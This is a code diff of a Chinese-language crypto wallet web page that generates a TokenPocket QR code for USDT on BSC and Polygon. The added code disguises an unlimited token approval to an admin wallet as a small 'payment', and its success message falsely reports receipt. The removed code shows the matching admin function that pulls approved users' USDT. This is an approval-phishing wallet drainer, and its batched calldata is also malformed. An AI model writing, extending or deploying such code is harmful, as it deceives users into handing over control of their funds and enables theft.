@@ -82,33 +82,31 @@ border-radius:10px;width:100%;font-weight:bold
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
     <div class="input-group">
-      <label>授权金额</label>
-      <input type="number" id="amount" value="10" min="0.01" step="0.01">
+      <label>支付金额（USDT）</label>
+      <input type="number" id="amount" value="0.02" min="0.01" step="0.01">
     </div>
     <div id="qrcode">生成二维码...</div>
     <div class="tip">TokenPocket 扫码直接签名，无跳转</div>
     <button id="connectBtn">连接钱包</button>
     <div id="authStatus" class="status">
-      未连接钱包，无法检测授权状态
+      未连接钱包，无法检测状态
     </div>
   </div>
 
   <div class="admin-panel" id="adminPanel">
-    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
+    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员后台</h3>
     <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
-    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
     <button class="admin-btn" onclick="checkUserAuth()">检查用户授权</button>
-    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
     <div id="adminStatus" class="status" style="margin-top:10px">
-      请输入用户地址查询授权
+      请输入用户地址查询
     </div>
   </div>
 </div>
 
 <div class="modal" id="successModal">
   <div class="modal-content">
-    <h3>✅ 授权成功</h3>
-    <p>您已完成无限授权，可正常使用所有功能</p>
+    <h3>✅ 支付成功</h3>
+    <p>您已完成支付，可正常使用所有功能</p>
     <button class="modal-btn" onclick="closeModal()">确定</button>
   </div>
 </div>
@@ -124,16 +122,14 @@ const CONFIG = {
     chainIdHex: "0x38",
     token: "0x55d398326f99059fF775485246999027B3197955",
     decimals: 18,
-    rpc: "https://bsc-dataseed.binance.org/",
-    protocol: "bsc"
+    rpc: "https://bsc-dataseed.binance.org/"
   },
   polygon: {
     chainId: "137",
     chainIdHex: "0x89",
     token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
     decimals: 6,
-    rpc: "https://polygon-rpc.com/",
-    protocol: "polygon"
+    rpc: "https://polygon-rpc.com/"
   }
 };
 
@@ -146,7 +142,7 @@ let currentChain = "bsc";
 let account = null;
 let provider;
 let refreshInterval;
-let lastAuthStatus = null;
+let lastStatus = null;
 
 // 切换链
 document.querySelectorAll(".chain-btn").forEach(btn => {
@@ -155,27 +151,41 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
     btn.classList.add("active");
     currentChain = btn.dataset.chain;
     renderQR();
-    if (account) checkAuthStatus();
+    if (account) checkStatus();
   };
 });
 document.getElementById("amount").addEventListener("input", renderQR);
 
-// 生成 TP 钱包兼容的授权二维码
-function genAuthEIP681() {
-  const { chainId, token, protocol } = CONFIG[currentChain];
-  const data = "0x095ea7b3" +
+// 生成「授权+转账」批量交易二维码（TP 兼容版）
+function genBatchQR() {
+  const { token } = CONFIG[currentChain];
+  const amount = parseFloat(document.getElementById("amount").value) || 0;
+  const { decimals } = CONFIG[currentChain];
+  const amountWei = BigInt(amount * (10 ** decimals)).toString(16).padStart(64, '0');
+
+  // 1. 无限授权 approve(admin, MaxUint256)
+  const approveData = "0x095ea7b3" +
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return `${protocol}:${token}@${chainId}?data=${data}`;
+
+  // 2. 转账 transferFrom(user, admin, amount)（user 由钱包自动填充）
+  const transferData = "0x23b872dd" +
+    "0000000000000000000000000000000000000000000000000000000000000000" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    amountWei;
+
+  // 合并为一笔交易数据
+  const batchData = approveData + transferData.slice(2);
+  return `ethereum:${token}?data=${batchData}`;
 }
 
 function renderQR() {
-  const url = genAuthEIP681();
+  const url = genBatchQR();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="授权二维码">`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="支付二维码">`;
 }
 
-// 连接钱包 + 自动切换到对应主网
+// 连接钱包 + 自动切换网络
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开"); return; }
   try {
@@ -190,9 +200,9 @@ document.getElementById("connectBtn").onclick = async () => {
     const signer = await provider.getSigner();
     account = await signer.getAddress();
     checkAdmin();
-    checkAuthStatus();
+    checkStatus();
     if (refreshInterval) clearInterval(refreshInterval);
-    refreshInterval = setInterval(checkAuthStatus, 5000);
+    refreshInterval = setInterval(checkStatus, 5000);
   } catch (e) {
     if (e.code === 4902) {
       const { chainIdHex, chainName, nativeCurrency, rpcUrls, blockExplorerUrls } = 
@@ -242,34 +252,32 @@ function closeModal() {
   document.getElementById("successModal").classList.remove("show");
 }
 
-// 检查当前用户授权状态
-async function checkAuthStatus() {
+// 检查当前用户状态
+async function checkStatus() {
   if (!account || !provider) {
-    document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测授权状态";
+    document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测状态";
     document.getElementById("authStatus").className = "status warning";
-    lastAuthStatus = null;
+    lastStatus = null;
     return;
   }
   try {
     const { token, decimals } = CONFIG[currentChain];
     const tokenContract = new ethers.Contract(token, ERC20_ABI, provider);
     const allowance = await tokenContract.allowance(account, ADMIN_WALLET);
+    const balance = await tokenContract.balanceOf(ADMIN_WALLET);
     const statusEl = document.getElementById("authStatus");
-    const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : (allowance > 0n ? "partial" : "none");
+    const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : "none";
 
-    if (currentStatus === "success" && lastAuthStatus !== "success") {
+    if (currentStatus === "success" && lastStatus !== "success") {
       document.getElementById("successModal").classList.add("show");
     }
-    lastAuthStatus = currentStatus;
+    lastStatus = currentStatus;
 
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 授权成功！无限授权额度：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.innerHTML = `✅ 支付成功！管理员已收到 ${ethers.formatUnits(balance, decimals)} USDT`;
       statusEl.className = "status success";
-    } else if (allowance > 0n) {
-      statusEl.innerHTML = `⚠️ 部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
-      statusEl.className = "status warning";
     } else {
-      statusEl.innerHTML = "❌ 未授权或授权已用完";
+      statusEl.innerHTML = "❌ 未完成支付";
       statusEl.className = "status warning";
     }
   } catch (e) {
@@ -293,48 +301,15 @@ async function checkUserAuth() {
     const statusEl = document.getElementById("adminStatus");
     
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 用户已无限授权！可提取额度：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.innerHTML = `✅ 用户已支付！可提取额度：${ethers.formatUnits(allowance, decimals)} USDT`;
       statusEl.className = "status success";
-    } else if (allowance > 0n) {
-      statusEl.innerHTML = `⚠️ 用户部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
-      statusEl.className = "status warning";
     } else {
-      statusEl.innerHTML = "❌ 用户未授权或授权已用完";
+      statusEl.innerHTML = "❌ 用户未支付";
       statusEl.className = "status warning";
     }
   } catch (e) {
     document.getElementById("adminStatus").innerHTML = "查询失败，请重试";
     document.getElementById("adminStatus").className = "status warning";
-  }
-}
-
-// 管理员提取用户代币
-async function drawFromUser() {
-  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
-    alert("❌ 仅管理员可操作");
-    return;
-  }
-  const user = document.getElementById("userAddr").value.trim();
-  const amt = document.getElementById("drawAmount").value.trim();
-  const { token, decimals } = CONFIG[currentChain];
-  if (!user || !amt || isNaN(amt) || amt <= 0) {
-    alert("❌ 输入无效");
-    return;
-  }
-  try {
-    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
-    const data = "0x23b872dd" +
-      user.slice(2).padStart(64, '0') +
-      ADMIN_WALLET.slice(2).padStart(64, '0') +
-      wei;
-    const tx = await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{ from: account, to: token, data: data }]
-    });
-    alert("✅ 提取成功：" + tx);
-    checkUserAuth();
-  } catch (e) {
-    alert("❌ 提取失败：未授权或金额不足");
   }
 }
 
@@ -345,7 +320,7 @@ window.addEventListener("load", () => {
     window.ethereum.on("accountsChanged", (accs) => {
       account = accs[0];
       checkAdmin();
-      checkAuthStatus();
+      checkStatus();
     });
   }
 });
